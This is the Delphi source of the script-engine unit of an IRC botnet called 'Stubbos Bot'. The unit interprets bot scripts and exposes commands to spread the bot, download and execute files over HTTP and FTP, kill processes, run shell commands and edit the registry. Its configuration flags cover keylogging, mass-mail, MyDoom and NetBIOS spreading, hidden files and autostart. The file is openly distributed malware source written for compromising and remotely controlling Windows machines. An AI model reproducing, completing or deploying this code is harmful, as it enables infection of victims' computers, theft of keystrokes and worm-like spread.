(*
   Stubbos Bot - Script Engine
   ---------------------------

   If you are gonna use this, put credit where credit is due.
   I created this for the possibility to manipulate the system
   in easy ways.

   It might still be bugs in this source-code, so if you find
   and, please contact me at: iminyourface@hotmail.com or
   at the ucc-forums (http://ucc.no-ip.org)

    .p0ke


   Example Script:

     .title "Test Script for Stubbos Bot V14B2"; $Set title
     .desc  "Only to see if script thing works"; $Set description

     str %information, %astring;                 $Declare strings
     int %randomint, %chint;                     $Declare integers

     %astring = "testing?";                      $Set shit into string
     %information = &(GetInfo);                  $same
     %randomint = ?(60);
     %chint = "60";

     output:%astring;  		                 $output for script-use
     output:(&(Admin))%information;              $output to admin
     output:(&(Channel))%randomint;              $output to channel
     output:(#test)%chint;                       $output to choosen channel
*)

unit untScriptEngine;

interface

uses
  Windows, untFunctions, untBot, ShellApi, untHTTPa, untFTPa;

{$I stubbos_config.ini}

Type
  tDeclares = Record
    dType   : Integer;
    dLength : Integer;
    dValue  : String;
    dName   : String;
  End;

Const
  RETURN_GOTO_WAIT      = 3;
  RETURN_GOTO_NEXT      = 2;
  RETURN_GOTO_ENDIF     = 1;
  RETURN_NORMAL         = 0;

Var
  Variables: Array[0..499] Of tDeclares;

  Function GetDesc(dScript: String): String;
  Function GetTitle(dScript: String): String;
  Procedure RunScript(dScript: String);
  Function IsVar(dName: String): String;

implementation

Procedure ReplaceVars(Var dText: String);
Var
  I: Integer;
  V: tDeclares;
Begin
  For I := 0 To 499 Do
  Begin
    V := Variables[I];
    If (V.dName <> '') Then
      ReplaceStr(V.dName, V.dValue, dText);
  End;
End;

Procedure ScriptOutput(dTo: String; dText: String);
Var
  dBuf  :String;
Begin
  ReplaceStr('&(admin)', BOT.IRC.LoggedName, dTo);
  ReplaceStr('&(channel)', BOT.Channel, dTo);
  dText := IsVar(dText);
  dTo := IsVar(dTo);
  ReplaceVars(dText);
  ReplaceVars(dTo);

  If (dTo = '') Then
  Begin
    dBuf := 'PRIVMSG '+BOT.Channel+' :'+dText+#10;
    BOT.SendData(dBuf, BOT.IsChat, BOT.IRC.Sock);
  End Else
  Begin
    dBuf := 'PRIVMSG '+dTo+' :'+dText+#10;
    BOT.SendData(dBuf, BOT.IsChat, BOT.IRC.Sock);
  End;
End;

Procedure Remove32(Var dText: String);
Begin
  Repeat
    ReplaceStr('  ', ' ', dText);
  Until (Pos('  ', dText) = 0);
  ReplaceStr(#13, '', dText);
  ReplaceStr(#10, '', dText);
End;

Function GetTitle(dScript: String): String;
Var
  dText :String;
Begin
  Result := 'No Title Found';
  ReadFileStr(dScript, dText);
  If (Pos('.title ', dText) > 0) Then
  Begin
    dText := Copy(dText, Pos('.title', dText)+7, Length(dText));
    dText := Copy(dText, 1, Pos(';', dText)-1);
    Result := dText;
    Remove32(Result);
  End;
End;

Function GetDesc(dScript: String): String;
Var
  dText :String;
Begin
  Result := 'No Description Found';
  ReadFileStr(dScript, dText);
  If (Pos('.desc ', dText) > 0) Then
  Begin
    dText := Copy(dText, Pos('.desc', dText)+6, Length(dText));
    dText := Copy(dText, 1, Pos(';', dText)-1);
    Result := dText;
    Remove32(Result);
  End;
End;

Function GetFreeSpot: Integer;
Var
  I: Integer;
  V: tDeclares;
Begin
  Result := -1;
  For I := 0 To 499 Do
  Begin
    V := Variables[I];
    If (V.dName = '') Then
    Begin
      Result := I;
      Break;
    End;
  End;
End;

Procedure AddVar(dType: Integer; dValue, dName: String);
Var
  Input: tDeclares;
  Fs   : Integer;
Begin
  Input.dType := dType;
  Input.dLength := Length(dValue);
  Input.dValue := dValue;
  Input.dName := dName;
  Fs := GetFreeSpot;
  If (Fs > -1) Then
    Variables[Fs] := Input;
End;

Procedure DelVar(dSpot: Integer);
Var
  V: tDeclares;
Begin
  V.dType := 0;
  V.dLength := 0;
  V.dValue := '';
  V.dName := '';
  If (dSpot > -1) and (dSpot < 500) Then
    Variables[dSpot] := V;
End;

Function GetVar(dName: String): String;
Var
  I: Integer;
  V: tDeclares;
Begin
  Result := '';
  For I := 0 To 499 Do
  Begin
    V := Variables[I];
    If (V.dName = dName) Then
    Begin
      Result := V.dValue;
      Break;
    End;
  End;
End;

Function SetVar(dName, dValue: String): Bool;
Var
  I: Integer;
  V: tDeclares;
Begin
  Result := False;
  ZeroMemory(@I, SizeOf(I));

  For I := 0 To 499 Do
  Begin
    V := Variables[I];
    If (V.dName = dName) Then
    Begin
      V.dValue := dValue;
      Variables[I] := V;
      Result := True;
      Break;
    End;
  End;
End;

Function IsVar(dName: String): String;
Var
  I: Integer;
  V: tDeclares;
Begin
  Result := dName;
  If (dName = '') Then Exit;
  If (dName[1] <> '%') Then dName := '%'+dName;
  If (GetVar(dName) <> '') Then Begin Result := GetVar(dName); Exit; End;

  ZeroMemory(@I, SizeOf(I));
  For I := 0 To 499 Do
  Begin
    V := Variables[I];
    If (V.dName = dName) Then
    Begin
      Result := V.dValue;
      Break;
    End;
  End;
End;

Function FixStr(dText: String): String;
Begin
  If (dText = '') Then Exit;

  While (dText[1] = ' ') Do
    If (dText <> '') Then
      Delete(dText,1,1) Else Break;

  While (dText[Length(dText)] = ' ') Do
    If (dText <> '') Then
      Delete(dText, Length(dText), 1) Else Break;

  ReplaceStr('\"', '"', dText);
  ReplaceStr('\$', '$', dText);
  Result := dText;
End;

Procedure SplitParams(dText: String; VAR dParam: Array Of String; Var dCount: Integer);
Var
  dTag  :Bool;
  dLen  :Integer;
  I     :Integer;
  dTemp :String;
Begin
  dText := dText + ',';
  dLen := 0;
  dTag := False;

  For I := 1 To Length(dText) Do
  Begin
    If (dText[I] = '"') Then
      If (dText[I-1] <> '\') Then
        If dTag Then dTag := False Else dTag := True;

    If (dText[i] = ',') Then
      If (Not dTag) Then
      Begin
        dTemp := IsVar(dTemp);
        dTemp := FixStr(dTemp);
        dParam[dLen] := dTemp;
        Inc(dLen);
        dTemp := '';
      End;

    If (dTag) Then
      If (dText[I] = '"') Then
      Begin
        If (dText[I-1] = '\') Then
          dTemp := dTemp + '"';
      End Else
        dTemp := dTemp + dText[i];

  End;
  dCount := dLen;
End;

Procedure AddMVar(dText: String; dType: Integer);
Var
  dTemp :String;
Begin
  Delete(dText, 1, 4);
  if (Pos(',', dText) > 0) Then
  Begin
    While (Pos(',', dText) > 0) Do
    Begin
      dTemp := Copy(dText, 1, Pos(',', dText)-1);
      dTemp := FixStr(dTemp);
      If (Copy(dTemp, 1, 1) = '%') Then
        AddVar(dType, '', FixStr(dTemp));
      dText := Copy(dText, Pos(',', dText)+1, Length(dText));
    End;
    If (dText <> '') Then
    Begin
      dText := FixStr(dText);
      If (Copy(dText, Length(dText), 1) = ';') Then
        Delete(dText, Length(dText), 1);
      If (Copy(dText, 1, 1) = '%') Then
        AddVar(dType, '', FixStr(dText));
    End;
  End Else
  Begin
    dText := Copy(dText, 1, Pos(';', dText)-1);
    If (Copy(dText, 1, 1) = '%') Then
      AddVar(dType, '', FixStr(dText));
  End;
End;

Procedure CallRand(dName, dRand: String);
Begin
  Delete(dRand, 1, 2);
  Delete(dRand, Length(dRand), 1);

  Randomize;
  SetVar(dName, IntToStr(Random(StrToInt(dRand))));
End;

Procedure CallProc(dName, dProc: String);
Var
  dParam: Array[0..50] Of String;
  dLen  : Integer;
  dVars : String;
Begin
  Delete(dProc, 1, 2);
  Delete(dProc, Length(dProc), 1);

  If (Pos('(', dProc) > 0) Then
  Begin
    dVars := Copy(dProc, Pos('(', dProc)+1, Length(dProc));
    dVars := Copy(dVars, 1, Pos(')', dVars)-1);
    dProc := Copy(dProc, 1, Pos('(', dProc)-1);
    ReplaceVars(dProc);
    ReplaceVars(dVars);
    SplitParams(dVars, dParam, dLen);
  End;

  // func
  If (LowerCase(dProc) = 'getdirectory') Then SetVar(dName, GetDirectory(StrToInt(dParam[0])));
  If (LowerCase(dProc) = 'directoryexist') Then SetVar(dName, IntToStr(Integer(DirectoryExists(dParam[0]))));
  If (LowerCase(dProc) = 'getregvalue') Then SetVar(dName, GetRegValue(HKEY(dParam[0]), dParam[1], dParam[2]));
  If (LowerCase(dProc) = 'getlocalip') Then SetVar(dName, GetLocalIP);
  If (LowerCase(dProc) = 'fileexists') Then SetVar(dName, IntToStr(Integer(FileExists(dParam[0]))));
  If (LowerCase(dProc) = 'fixlength') Then SetVar(dName, FixLength(dParam[0], StrToInt(dParam[1])));
  If (LowerCase(dProc) = 'randircbot') Then SetVar(dName, RandIRCBot);
  If (LowerCase(dProc) = 'getlocalname') Then SetVar(dName, GetLocalName);
  If (LowerCase(dProc) = 'resolveip') Then SetVar(dName, ResolveIP(dParam[0]));
  If (LowerCase(dProc) = 'extractfilename') Then SetVar(dName, ExtractFileName(dParam[0]));
  If (LowerCase(dProc) = 'lowercase') Then SetVar(dName, LowerCase(dParam[0]));
  If (LowerCase(dProc) = 'getfilesize') Then SetVar(dName, IntToStr(GetFileSize(dParam[0])));
  If (LowerCase(dProc) = 'getcpuspeed') Then SetVar(dName, IntToStr(GetCPUSpeed));
  If (LowerCase(dProc) = 'getinfo') Then SetVar(dName, GetInfo);
  If (LowerCase(dProc) = 'killproc') Then SetVar(dName, IntToStr(Integer(KillProc(dParam[0]))));
  If (LowerCase(dProc) = 'listproc') Then SetVar(dName, ListProc);
  If (LowerCase(dProc) = 'rundosincap') Then SetVar(dName, RunDosInCap(dParam[0]));
  If (LowerCase(dProc) = 'pos') Then SetVar(dName, IntToStr(Pos(dParam[0], dParam[1])));
  If (LowerCase(dProc) = 'copy') Then SetVar(dName, Copy(dParam[0], StrToInt(dParam[1]), StrToInt(dParam[2])));
  If (LowerCase(dProc) = 'len') Then SetVar(dName, IntToStr(Length(dParam[0])));
  If (LowerCase(dProc) = 'inc') Then SetVar(dName, IntToStr(StrToInt(dParam[0])+StrToInt(dParam[1])));
  If (LowerCase(dProc) = 'dec') Then SetVar(dName, IntToStr(StrToInt(dParam[0])+StrToInt(dParam[1])));

  // bot config
  if (LowerCase(dProc) = 'show_output')                 Then SetVar(dName, {$IFDEF SHOW_OUTPUT}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'no_global_debug')             Then SetVar(dName, {$IFDEF NO_GLOBAL_DEBUG}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_change_topic')            Then SetVar(dName, {$IFDEF BOT_CHANGE_TOPIC}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_send_msg')                Then SetVar(dName, {$IFDEF BOT_SEND_MSG}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_report_failure')          Then SetVar(dName, {$IFDEF BOT_REPORT_FAILURE}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_ban_after_failure')       Then SetVar(dName, {$IFDEF BOT_BAN_AFTER_FAILURE}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_log_ircnames')            Then SetVar(dName, {$IFDEF BOT_LOG_IRCNAMES}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_netbios')                 Then SetVar(dName, {$IFDEF BOT_NETBIOS}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_mydoom')                  Then SetVar(dName, {$IFDEF BOT_MYDOOM}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_dcpp')                    Then SetVar(dName, {$IFDEF BOT_DCPP}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_massmail')                Then SetVar(dName, {$IFDEF BOT_MASSMAIL}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_irc')                     Then SetVar(dName, {$IFDEF BOT_IRC}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_p2p')                     Then SetVar(dName, {$IFDEF BOT_P2P}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_pe')                      Then SetVar(dName, {$IFDEF BOT_PE}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_hidefile')                Then SetVar(dName, {$IFDEF BOT_HIDEFILE}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_createmutex')             Then SetVar(dName, {$IFDEF BOT_CREATEMUTEX}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_waitforinternet')         Then SetVar(dName, {$IFDEF BOT_WAITFORINTERNET}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_plugin_support')          Then SetVar(dName, {$IFDEF BOT_PLUGIN_SUPPORT}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_regstart')                Then SetVar(dName, {$IFDEF BOT_REGSTART}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_shellstart')              Then SetVar(dName, {$IFDEF BOT_SHELLSTART}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_reply_ping')              Then SetVar(dName, {$IFDEF BOT_REPLY_PING}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_reply_version')           Then SetVar(dName, {$IFDEF BOT_REPLY_VERSION}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_reply_fakeversion')       Then SetVar(dName, {$IFDEF BOT_REPLY_FAKEVERSION}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_reply_realversion')       Then SetVar(dName, {$IFDEF BOT_REPLY_REALVERSION}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_info_showip')             Then SetVar(dName, {$IFDEF BOT_INFO_SHOWIP}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_info_showhostname')       Then SetVar(dName, {$IFDEF BOT_INFO_SHOWHOSTNAME}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_info_showcpuspeed')       Then SetVar(dName, {$IFDEF BOT_INFO_SHOWCPUSPEED}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_info_showmemorystatus')   Then SetVar(dName, {$IFDEF BOT_INFO_SHOWMEMORYSTATUS}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_info_showosversion')      Then SetVar(dName, {$IFDEF BOT_INFO_SHOWOSVERSION}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_info_showdate')           Then SetVar(dName, {$IFDEF BOT_INFO_SHOWDATE}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_info_showtime')           Then SetVar(dName, {$IFDEF BOT_INFO_SHOWTIME}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_info_showsysdir')         Then SetVar(dName, {$IFDEF BOT_INFO_SHOWSYSDIR}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_send_filelist')           Then SetVar(dName, {$IFDEF BOT_SEND_FILELIST}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_send_proclist')           Then SetVar(dName, {$IFDEF BOT_SEND_PROCLIST}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_usekeylogg')              Then SetVar(dName, {$IFDEF BOT_USEKEYLOGG}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_dotopic_cmd')             Then SetVar(dName, {$IFDEF BOT_DOTOPIC_CMD}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_melt')                    Then SetVar(dName, {$IFDEF BOT_MELT}'1'{$ELSE}'0'{$ENDIF});
  if (LowerCase(dProc) = 'bot_webservertitle')          Then SetVar(dName, BOT_WEBSERVERTITLE);
  if (LowerCase(dProc) = 'bot_fakeversion')             Then SetVar(dName, BOT_FAKEVERSION);
  if (LowerCase(dProc) = 'bot_realversion')             Then SetVar(dName, BOT_REALVERSION);
  if (LowerCase(dProc) = 'bot_quitmessage')             Then SetVar(dName, BOT_QUITMESSAGE);
  if (LowerCase(dProc) = 'bot_kickmsg')                 Then SetVar(dName, BOT_KICKMSG);
  if (LowerCase(dProc) = 'bot_keylogg_filename')        Then SetVar(dName, BOT_KEYLOGG_FILENAME);
  if (LowerCase(dProc) = 'bot_keylogg_max_size_b')      Then SetVar(dName, IntToStr(BOT_KEYLOGG_MAX_SIZE_B));
  if (LowerCase(dProc) = 'bot_prefix')                  Then SetVar(dName, BOT_PREFIX);
  if (LowerCase(dProc) = 'bot_server')                  Then SetVar(dName, BOT_SERVER);
  if (LowerCase(dProc) = 'bot_port')                    Then SetVar(dName, IntToStr(BOT_PORT));
  if (LowerCase(dProc) = 'bot_channel')                 Then SetVar(dName, BOT_CHANNEL);
  if (LowerCase(dProc) = 'bot_key')                     Then SetVar(dName, BOT_KEY);
  if (LowerCase(dProc) = 'bot_password')                Then SetVar(dName, BOT_PASSWORD);
  if (LowerCase(dProc) = 'bot_max_clones')              Then SetVar(dName, IntToStr(BOT_MAX_CLONES));
  if (LowerCase(dProc) = 'bot_meltfilename')            Then SetVar(dName, BOT_MELTFILENAME);
  if (LowerCase(dProc) = 'bot_nametag')                 Then SetVar(dName, BOT_NAMETAG);
  if (LowerCase(dProc) = 'bot_set_topic')               Then SetVar(dName, BOT_SET_TOPIC);
  if (LowerCase(dProc) = 'bot_send_pm')                 Then SetVar(dName, BOT_SEND_PM);
  if (LowerCase(dProc) = 'bot_send_pm_voice')           Then SetVar(dName, BOT_SEND_PM_VOICE);
  if (LowerCase(dProc) = 'bot_send_pm_unvoice')         Then SetVar(dName, BOT_SEND_PM_UNVOICE);
  if (LowerCase(dProc) = 'bot_copydll')                 Then SetVar(dName, IntToStr(Integer(BOT_COPYDLL)));
  if (LowerCase(dProc) = 'bot_installdir')              Then SetVar(dName, IntToStr(BOT_INSTALLDIR));
  if (LowerCase(dProc) = 'bot_installname')             Then SetVar(dName, BOT_INSTALLNAME);
  if (LowerCase(dProc) = 'bot_mutex')                   Then SetVar(dName, BOT_MUTEX);
  if (LowerCase(dProc) = 'bot_regedit_path')            Then SetVar(dName, BOT_REGEDIT_PATH);
  if (LowerCase(dProc) = 'bot_regedit_subpath')         Then SetVar(dName, BOT_REGEDIT_SUBPATH);
  if (LowerCase(dProc) = 'bot_runscripts')              Then SetVar(dName, IntToStr(Integer(BOT_RUNSCRIPTS)));
  if (LowerCase(dProc) = 'bot_placescript')             Then SetVar(dName, IntToStr(BOT_PLACESCRIPT));
  if (LowerCase(dProc) = 'bot_scriptdir')               Then SetVar(dName, BOT_SCRIPTDIR);

  // bot func
  If (LowerCase(dProc) = 'botadmin') Then SetVar(dName, BOT.IRC.LoggedName);
  If (LowerCase(dProc) = 'botchannel') Then SetVar(dName, BOT.Channel);
  If (LowerCase(dProc) = 'botadminhost') Then SetVar(dName, BOT.IRC.LoggedHost);
  If (LowerCase(dProc) = 'botkey') Then SetVar(dName, BOT.Key);
  If (LowerCase(dProc) = 'botserver') Then SetVar(dName, BOT.Server);
  If (LowerCase(dProc) = 'botport') Then SetVar(dName, IntToStr(BOT.Port));
  If (LowerCase(dProc) = 'botpassword') Then SetVar(dName, BOT.Password);
  If (LowerCase(dProc) = 'botnick') Then SetVar(dName, BOT.Nick);

  // proc
  If (LowerCase(dProc) = 'sleep') Then Sleep(StrToInt(dParam[0]));
  If (LowerCase(dProc) = 'loadscript') Then RunScript(dParam[0]);
  If (LowerCase(dProc) = 'douninstall') Then DoUninstall;
  If (LowerCase(dProc) = 'initialize') Then Initialize;
  If (LowerCase(dProc) = 'setregvalue') Then SetRegValue(HKEY(dParam[0]), dParam[1], dParam[2], dParam[3]);
  If (LowerCase(dProc) = 'startspreading') Then StartSpreading;
  If (LowerCase(dProc) = 'downloadfile') Then DownloadFileFromURL(dParam[0], dParam[1]);
  If (LowerCase(dProc) = 'execute') Then ShellExecute(0, 'open', pChar(dParam[0]), nil, nil, 1);
  If (LowerCase(dProc) = 'delete') Then DeleteFile(pChar(dParam[0]));

  If (LowerCase(dProc) = 'httpdownload') Then DownloadFileFromUrl(dParam[0], dParam[1]);
  If (LowerCase(dProc) = 'httpexecute') Then ExecuteFileFromUrl(dParam[0], dParam[1]);
  If (LowerCase(dProc) = 'httpupdate') Then UpdateFileFromUrl(dParam[0], dParam[1]);
  If (LowerCase(dProc) = 'ftpdownload') Then DownloadFileFromFTP(dParam[0], dParam[1], dParam[2], dParam[3], StrToInt(dParam[4]));
  If (LowerCase(dProc) = 'ftpexecute') Then ExecuteFileFromFTP(dParam[0], dParam[1], dParam[2], dParam[3], StrToInt(dParam[4]));
  If (LowerCase(dProc) = 'ftpupdate') Then UpdateFileFromFTP(dParam[0], dParam[1], dParam[2], dParam[3], StrToInt(dParam[4]));
End;

Function ExecuteScript(rLine: String): Integer;
Var
  dTemp :String;
  dValue:String;

  dIfVal:String;
  dIfCom:String;
  dIfVal2:String;
Begin
  Result := RETURN_NORMAL;
  rLine := FixStr(rLine);

  If (Copy(rLine, 1, 3) = '.if') Then
  Begin
    Delete(rLine, 1, 4);

    If (Copy(rLine, 1, 1) = '"') Then
    Begin
      dIfVal := Copy(rLine, 1, Pos('" ', rLine)-1);
      If (Copy(dIfVal, 1, 1) = '"') Then Delete(dIfVal, 1, 1);
      rLine := Copy(rLine, Pos('" ', rLine)+2, Length(rLine));
    End Else
    Begin
      dIfVal := COpy(rLine, 1, Pos(' ', rLine)-1);
      rLine := Copy(rLine, Pos(' ', rLine)+1, Length(rLine));
    End;

    dIfCom := Copy(rLine, 1, Pos(' ', rLine)-1);
    rLine := Copy(rLine, Pos(' ', rLine)+1, Length(rLine));
    dIfVal2 := rLine;

    If (Copy(dIfVal2, 1, 1) = '"') Then Delete(dIfVal2, 1, 1);
    If (Copy(dIfVal2, Length(dIfVal2), 1) = '"') Then Delete(dIfVal2, Length(dIfVal2), 1);

    ReplaceVars(dIfVal);
    ReplaceVars(dIfVal2);

    If (dIfCom = '==') Then
      If (dIfVal = dIfVal2) Then Result := RETURN_GOTO_NEXT Else Result := RETURN_GOTO_ENDIF;
    If (dIfCom = '>>') Then
      If (dIfVal > dIfVal2) Then Result := RETURN_GOTO_NEXT Else Result := RETURN_GOTO_ENDIF;
    If (dIfCom = '>=') Then
      If (dIfVal >= dIfVal2) Then Result := RETURN_GOTO_NEXT Else Result := RETURN_GOTO_ENDIF;
    If (dIfCom = '<<') Then
      If (dIfVal < dIfVal2) Then Result := RETURN_GOTO_NEXT Else Result := RETURN_GOTO_ENDIF;
    If (dIfCom = '<=') Then
      If (dIfVal <= dIfVal2) Then Result := RETURN_GOTO_NEXT Else Result := RETURN_GOTO_ENDIF;
    If (dIfCom = '!=') Then
      If (dIfVal <> dIfVal2) Then Result := RETURN_GOTO_NEXT Else Result := RETURN_GOTO_ENDIF;
  End;

  If (Copy(rLine, 1, 3) = 'str') Then
    AddMVar(rLine,1);

  If (Copy(rLine, 1, 3) = 'int') Then
    AddMVar(rLine,2);

  If (Copy(rLine, 1, 1) = '&') Then
  Begin
    dTemp := Copy(rLine, 1, Length(rLine)-1);
    CallProc('', dTemp);
  End;

  If (Copy(rLine, 1, 1) = '%') Then
  Begin
    dTemp := Copy(rLine, 1, Pos('=', rLine)-1);
    dValue := Copy(rLine, Pos('=', rLine)+1, Length(rLine));
    dTemp := FixStr(dTemp);
    dValue := FixStr(dValue);
    If (dValue[Length(dValue)] = ';') Then Delete(dValue, Length(dValue), 1);

    If (Copy(rLine, Pos('=', rLine)-1, 1) = '.') Then
      dValue := GetVar(dTemp) + dValue;

    If (Copy(dValue, 1, 1) = '"') Then Delete(dValue, 1, 1);
    If (Copy(dValue, Length(dValue), 1) = '"') Then Delete(dValue, Length(dValue), 1);
    ReplaceVars(dValue);
    SetVar(dTemp, dValue);
    If (Copy(dValue, 1, 1) = '&') Then
      CallProc(dTemp, dValue);
    If (Copy(dValue, 1, 1) = '?') Then
      CallRand(dTemp, dValue);
  End;

  If (Copy(rLine, 1, 6) = 'output') Then
  Begin
    ReplaceVars(rLine);
    dTemp := Copy(rLine, 7, Length(rLine));
    If dTemp[1] = ':' Then Delete(dTemp, 1, 1);

    If (Copy(dTemp, 1, 1) = '(') Then
    Begin
      Delete(dTemp, 1, 1);
      dValue := Copy(dTemp, pos(')', dTemp)+1, Length(dTemp));
      dValue := Copy(dValue, 1, Pos(';', dValue)-1);
      dTemp := Copy(dTemp, 1, Pos(')', dTemp));
      If (Copy(dValue, 1, 1) = ')') Then Delete(dValue, 1, 1);      
      If (Copy(dValue, 1, 1) = '"') Then Delete(dValue, 1, 1);
      If (Copy(dValue, Length(dValue), 1) = '"') Then Delete(dValue, Length(dValue), 1);
      ReplaceVars(dTemp);
      ReplaceVars(dValue);
      ScriptOutput(dTemp, dValue);
    End Else
    Begin
      dTemp := FixStr(dTemp);
      If (Copy(dTemp, Length(dTemp), 1) = ';') Then
        Delete(dTemp, Length(dTemp), 1);
      dTemp := IsVar(dTemp);
      If (Copy(dTemp, 1, 1) = '"') Then Delete(dTemp, 1, 1);
      If (Copy(dTemp, Length(dTemp), 1) = '"') Then Delete(dTemp, Length(dTemp), 1);
      ReplaceVars(dTemp);
      {$IFDEF SHOW_OUTPUT}
        WriteLn('Script Output > '+dTemp);
      {$ELSE}
        MessageBox(0, pChar(dTemp), 'Script Output', MB_ok);
      {$ENDIF}
    End;
  End;
End;

Procedure RemoveComment(VAR dText: String);
Var
  I     :Integer;
Begin
  ReplaceStr(#9, #32, dText);
  If (Pos('$', dText) > 0) Then
    For I := Length(dText) DownTo 1 Do
      If (dText[i] = '$') Then
        If (dText[i-1] <> '\') Then
          dText := Copy(dText, 1, I-1);
End;

Procedure RunScript(dScript: String);
Var
  F             :TextFile;
  tLine         :String;
  rLine         :String;

  dBracket      :Integer;
  dReturn       :Integer;
Label
  EatMe;
Begin
  If (Not BOT_RUNSCRIPTS) Then Exit;
  If (Not FileExists(dScript)) Then Exit;

  dBracket := 0;

  AssignFile(F, dScript);
  Reset(F);

  Read(F, tLine);
  ReadLn(F, rLine);
  If (FixStr(tLine)) = '.exit' Then Goto EatMe;
  dReturn := ExecuteScript(tLine);

  While (NOT EOF(F)) Do
  Begin
    Read(F, tLine);
    ReadLn(F, rLine);
    If (FixStr(tLine)) = '.exit' Then Break;
    If (Copy(tLine, 1, 6) = '.endif') And (dBracket > 0) Then Dec(dBracket);
    If (dReturn = RETURN_NORMAL) or (dReturn = RETURN_GOTO_NEXT) Then
      dReturn := ExecuteScript(tLine);
    If (dReturn = RETURN_GOTO_ENDIF) Then Inc(dBracket);
    If (dReturn = RETURN_GOTO_ENDIF) Then dReturn := RETURN_GOTO_WAIT;
    If (dBracket = 0) Then dReturn := RETURN_NORMAL;
  End;
EatMe:
  CloseFile(F);
End;

end.

